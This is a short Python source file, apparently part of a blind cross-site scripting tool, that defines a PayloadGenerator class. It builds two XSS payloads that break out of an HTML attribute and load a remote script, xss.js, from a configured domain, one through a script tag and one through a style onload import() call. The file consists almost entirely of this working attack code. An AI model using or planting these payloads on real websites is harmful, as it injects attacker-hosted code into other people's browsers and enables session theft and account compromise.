from modules.config import Config

class PayloadGenerator:
    def __init__(self):
        self.config = Config()
        self.payloads = []
        self.generate_payloads()

    def generate_payloads(self):
        if (self.config.domain == ''):
            print(f"Please set the domain in the config file. ({Config().config_location})")
            exit()
        payloads = [
            f'\"\'><script src="//{self.config.domain}/xss.js"></script>',
            f'\"\'><style/onload=import("//{self.config.domain}/xss.js")>',
        ]
        self.payloads = payloads

    def get_payloads(self):
        return self.payloads